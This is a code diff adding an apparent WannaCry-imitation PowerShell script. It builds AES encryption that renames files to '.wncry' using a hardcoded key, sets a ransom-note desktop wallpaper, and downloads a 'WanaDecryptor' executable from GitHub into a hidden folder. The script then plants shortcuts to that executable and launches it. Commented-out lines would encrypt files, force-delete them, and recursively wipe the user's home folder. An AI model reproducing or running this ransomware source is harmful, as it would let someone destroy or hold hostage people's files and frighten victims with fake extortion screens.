@@ -1,0 +1,234 @@
+#Najpierw usuwa pliki z desktop, potem tapety a potem resztę
+
+########################    Sprawdzanie polaczenia internetowego    ########################
+
+if (-not (Test-NetConnection -ComputerName google.com -InformationLevel Quiet)) {
+    Add-Type -AssemblyName PresentationCore,PresentationFramework
+    [System.Windows.MessageBox]::Show("Check your internet connection and try again", "Error", "Ok", "Error")
+    exit
+}
+
+########################    ####################################    ########################
+
+$default_dic = "$home"
+
+function Invoke-AESEncryption {
+    [CmdletBinding()]
+    [OutputType([string])]
+    Param
+    (
+        [Parameter(Mandatory = $true)]
+        [ValidateSet('Encrypt', 'Decrypt')]
+        [String]$Mode,
+
+        [Parameter(Mandatory = $true)]
+        [String]$Key,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
+        [String]$Text,
+
+        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
+        [String]$Path
+    )
+
+    Begin {
+        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
+        $aesManaged = New-Object System.Security.Cryptography.AesManaged
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+    }
+
+    Process {
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
+
+        switch ($Mode) {
+            'Encrypt' {
+                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName + ".wncry"
+                }
+
+                $encryptor = $aesManaged.CreateEncryptor()
+                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+                $encryptedBytes = $aesManaged.IV + $encryptedBytes
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File encrypted to $outPath"
+                }
+            }
+
+            'Decrypt' {
+                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
+                
+                if ($Path) {
+                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
+                    if (!$File.FullName) {
+                        Write-Error -Message "File not found!"
+                        break
+                    }
+                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
+                    $outPath = $File.FullName -replace ".wncry"
+                }
+
+                $aesManaged.IV = $cipherBytes[0..15]
+                $decryptor = $aesManaged.CreateDecryptor()
+                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
+                $aesManaged.Dispose()
+
+                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
+                
+                if ($Path) {
+                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
+                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
+                    return "File decrypted to $outPath"
+                }
+            }
+        }
+    }
+
+    End {
+        $shaManaged.Dispose()
+        $aesManaged.Dispose()
+    }
+}
+
+########################    Szyfrowanie plików    ########################
+
+$key = "qwerty"
+#cd $default_dic
+
+#Get-ChildItem -Path $file | Where-Object { $_.Extension -ne ".wncry" } | ForEach-Object { Invoke-AESEncryption -Mode Encrypt -Key $key -Path $_.FullName }
+#Get-ChildItem -Path $file | Where-Object { $_.Extension -ne ".wncry" } | Remove-Item -Force
+
+########################    Ustawianie tapety    ########################
+
+
+$header = "`n`n`n`n                   Ooops, your important files are encrypted."
+$text = "`n`n`n`n`n`n`n`n                    `n                    If you see this text, but don't see the                 ,`n                    then your antivirus removed the decrypt software or you deleted`n                    it from your computer.`n                    `n                    If you need your files you have to run the decrypt software.`n                    `n                    Please find an application file named                       in`n                    any folder to restore fron the antivirus quarantine.`n                    `n                    Run and follow the instructions!"
+
+
+Add-Type -AssemblyName System.Drawing
+
+$bmp = new-object System.Drawing.Bitmap 1920,1080 
+
+$header_font = New-Object System.Drawing.Font("Consolas", 32, [System.Drawing.FontStyle]::Bold)
+$font = new-object System.Drawing.Font Consolas,25
+
+$brushBg = New-Object System.Drawing.SolidBrush(([System.Drawing.ColorTranslator]::FromHtml("#000000")))
+$red = New-Object System.Drawing.SolidBrush(([System.Drawing.ColorTranslator]::FromHtml("#CF131F")))
+$dark_red = New-Object System.Drawing.SolidBrush(([System.Drawing.ColorTranslator]::FromHtml("#941820")))
+$blue = New-Object System.Drawing.SolidBrush(([System.Drawing.ColorTranslator]::FromHtml("#354AC0")))
+
+$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
+$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
+
+$graphics.DrawString($header, $header_font, $red, 10, 50)
+$graphics.DrawString($text, $font, $dark_red, 10, 50)
+
+$graphics.DrawString("`n`n`n`n`n`n`n`n`n                                                            `"Wana Decrypt0r`"", $font, $blue, 10, 50)
+$graphics.DrawString("`n`n`n`n`n`n`n`n`n`n`n`n`n`n`n                                                          `"@WanaDecryptor@.exe`"", $font, $blue, 10, 50)
+
+
+$graphics.Dispose() 
+$bmp.Save("$home\.png") 
+
+Function Set-WallPaper {
+param (
+    [parameter(Mandatory=$True)]
+    # Provide path to image
+    [string]$Image,
+    # Provide wallpaper style that you would like applied
+    [parameter(Mandatory=$False)]
+    [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
+    [string]$Style)
+$WallpaperStyle = Switch ($Style) {
+    "Center" {"0"}}
+If($Style -eq "Tile") {
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
+}
+Else {
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
+    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force}
+Add-Type -TypeDefinition @" 
+using System; 
+using System.Runtime.InteropServices;
+public class Params { 
+    [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
+    public static extern int SystemParametersInfo (Int32 uAction, 
+                                                   Int32 uParam, 
+                                                   String lpvParam, 
+                                                   Int32 fuWinIni);}
+"@ 
+    $SPI_SETDESKWALLPAPER = 0x0014
+    $UpdateIniFile = 0x01
+    $SendChangeEvent = 0x02
+    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
+    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)}
+
+Set-WallPaper -Image "$home\.png" -Style Center
+
+########################    Pobieranie WanaDecrypt0r, tworzenie skrótu i otwieranie go    ########################
+
+cd $home
+New-Item -ItemType Directory -Force -Path $home\app
+ATTRIB +H app
+cd app
+
+Invoke-WebRequest 'https://raw.githubusercontent.com/Zakrzewiaczek/WannaCry/main/%40WanaDecryptor%40/bin/Debug/net8.0-windows/%40WanaDecryptor%40.runtimeconfig.json' -OutFile "./@WanaDecryptor@.runtimeconfig.json"
+Invoke-WebRequest 'https://raw.githubusercontent.com/Zakrzewiaczek/WannaCry/main/%40WanaDecryptor%40/bin/Debug/net8.0-windows/%40WanaDecryptor%40.dll' -OutFile "./@WanaDecryptor@.dll"
+Invoke-WebRequest 'https://raw.githubusercontent.com/Zakrzewiaczek/WannaCry/main/%40WanaDecryptor%40/bin/Debug/net8.0-windows/%40WanaDecryptor%40.exe' -OutFile "./@WanaDecryptor@.exe"
+Invoke-WebRequest 'https://raw.githubusercontent.com/Zakrzewiaczek/WannaCry/main/%40WanaDecryptor%40/Resources/icon.ico' -OutFile "./icon.ico"
+
+cd..
+
+$file_path = "$home\app\@WanaDecryptor@.exe"
+$icon_path = "$home\app\icon.ico"
+$shortcut_name = "@WanaDecryptor@.exe"
+
+$WshShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WshShell.CreateShortcut("$([Environment]::GetFolderPath('Desktop'))\$shortcut_name.lnk")
+$Shortcut.TargetPath = $file_path
+$Shortcut.IconLocation = $icon_path
+$Shortcut.Save()
+
+$folders = Get-ChildItem -Path "$home\Desktop" -Directory
+foreach ($folder in $folders) {
+    $WshShell = New-Object -ComObject WScript.Shell
+    $Shortcut = $WshShell.CreateShortcut("$($folder.FullName)\$shortcut_name.lnk")
+    $Shortcut.TargetPath = $file_path
+    $Shortcut.IconLocation = $icon_path
+    $Shortcut.Save()
+}
+
+start $file_path
+
+########################    usuwanie plikow jak nie znaleziono    ########################
+
+$app_folder = "$home\app"
+$decryptor_exe = "$app_folder\@WanaDecryptor@.exe"
+$decryptor_dll = "$app_folder\@WanaDecryptor@.dll"
+$decryptor_config = "$app_folder\@WanaDecryptor@.runtimeconfig.json"
+$decryptor_icon = "$app_folder\icon.ico"
+$task_data = "$home\Task Data"
+
+if ((Test-Path $app_folder) -and (Test-Path $decryptor_exe) -and (Test-Path $decryptor_dll) -and (Test-Path $decryptor_config) -and (Test-Path $decryptor_icon) -and (Test-Path $task_data)) {
+    Write-Host "All files found. No action taken."
+} else {
+    Write-Host "Files not found. Deleting all files in $home."
+    #Remove-Item "$default_dic\*" -Recurse -Force -Verbose
+}
